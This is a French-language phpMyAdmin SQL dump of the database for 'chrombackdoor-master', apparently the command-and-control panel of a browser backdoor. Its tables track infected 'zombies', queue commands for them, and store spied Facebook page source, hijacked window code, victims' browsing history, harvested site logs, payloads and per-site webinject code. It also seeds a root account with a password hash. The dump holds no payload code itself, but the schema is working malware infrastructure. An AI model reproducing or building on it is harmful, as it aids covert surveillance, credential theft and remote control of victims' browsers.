-- phpMyAdmin SQL Dump
-- version 4.4.10
-- http://www.phpmyadmin.net
--
-- Client :  localhost:8889
-- Généré le :  Ven 15 Avril 2016 à 10:48
-- Version du serveur :  5.5.42
-- Version de PHP :  5.6.10

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données :  `chrombackdoor-master`
--

-- --------------------------------------------------------

--
-- Structure de la table `action_wait`
--

CREATE TABLE `action_wait` (
  `id` int(11) NOT NULL,
  `zombie_name` text NOT NULL,
  `commande` text NOT NULL,
  `used` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Structure de la table `bots`
--

CREATE TABLE `bots` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `backdoor_name` text NOT NULL,
  `numbers_logs` int(11) NOT NULL DEFAULT '0',
  `online` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Structure de la table `bot_settings`
--

CREATE TABLE `bot_settings` (
  `id` int(11) NOT NULL,
  `setting_name` text NOT NULL,
  `setting_value` text NOT NULL,
  `bot_id` text NOT NULL,
  `available` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Structure de la table `facebookspy`
--

CREATE TABLE `facebookspy` (
  `id` int(11) NOT NULL,
  `bot_id` int(11) NOT NULL,
  `source_code` longtext NOT NULL,
  `date_last` text NOT NULL,
  `new` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Structure de la table `hijacking_window`
--

CREATE TABLE `hijacking_window` (
  `id` int(11) NOT NULL,
  `bot_id` int(11) NOT NULL,
  `windows_code` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Structure de la table `history_web`
--

CREATE TABLE `history_web` (
  `id` int(11) NOT NULL,
  `website` text NOT NULL,
  `zombie` text NOT NULL,
  `timevisit` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Structure de la table `logs_checker`
--

CREATE TABLE `logs_checker` (
  `id` int(11) NOT NULL,
  `id_zombie` int(11) NOT NULL,
  `url_site` text NOT NULL,
  `logs_site` text NOT NULL,
  `last` int(11) DEFAULT '0',
  `zombie` text NOT NULL,
  `webinject` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Structure de la table `payloads`
--

CREATE TABLE `payloads` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `urlverif` text NOT NULL,
  `codeinject` text NOT NULL,
  `action` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Structure de la table `settings`
--

CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `hide_panel` int(11) NOT NULL DEFAULT '0',
  `get_name` text NOT NULL,
  `get_value` text NOT NULL,
  `jabber_username` text NOT NULL,
  `jabber_password` text NOT NULL,
  `jabber_to` text NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Contenu de la table `settings`
--

INSERT INTO `settings` (`id`, `hide_panel`, `get_name`, `get_value`, `jabber_username`, `jabber_password`, `jabber_to`) VALUES
(1, 0, '', '', '', '', '');

-- --------------------------------------------------------

--
-- Structure de la table `utilisateurs`
--

CREATE TABLE `utilisateurs` (
  `id` int(11) NOT NULL,
  `username` text NOT NULL,
  `password` varchar(255) NOT NULL,
  `roles` int(11) NOT NULL DEFAULT '3',
  `bot` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Contenu de la table `utilisateurs`
--

INSERT INTO `utilisateurs` (`id`, `username`, `password`, `roles`, `bot`) VALUES
(1, 'root', '7b24afc8bc80e548d66c4e7ff72171c5', 0, 0);

-- --------------------------------------------------------

--
-- Structure de la table `webinject`
--

CREATE TABLE `webinject` (
  `id` int(11) NOT NULL,
  `webinject_site` text NOT NULL,
  `webinject_code` text NOT NULL,
  `webinject_status` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Index pour les tables exportées
--

--
-- Index pour la table `action_wait`
--
ALTER TABLE `action_wait`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `bots`
--
ALTER TABLE `bots`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `bot_settings`
--
ALTER TABLE `bot_settings`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `facebookspy`
--
ALTER TABLE `facebookspy`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `hijacking_window`
--
ALTER TABLE `hijacking_window`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `history_web`
--
ALTER TABLE `history_web`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `logs_checker`
--
ALTER TABLE `logs_checker`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `payloads`
--
ALTER TABLE `payloads`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `utilisateurs`
--
ALTER TABLE `utilisateurs`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `webinject`
--
ALTER TABLE `webinject`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT pour les tables exportées
--

--
-- AUTO_INCREMENT pour la table `action_wait`
--
ALTER TABLE `action_wait`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT pour la table `bots`
--
ALTER TABLE `bots`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT pour la table `bot_settings`
--
ALTER TABLE `bot_settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT pour la table `facebookspy`
--
ALTER TABLE `facebookspy`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT pour la table `hijacking_window`
--
ALTER TABLE `hijacking_window`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT pour la table `history_web`
--
ALTER TABLE `history_web`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT pour la table `logs_checker`
--
ALTER TABLE `logs_checker`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT pour la table `payloads`
--
ALTER TABLE `payloads`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT pour la table `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT pour la table `utilisateurs`
--
ALTER TABLE `utilisateurs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT pour la table `webinject`
--
ALTER TABLE `webinject`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
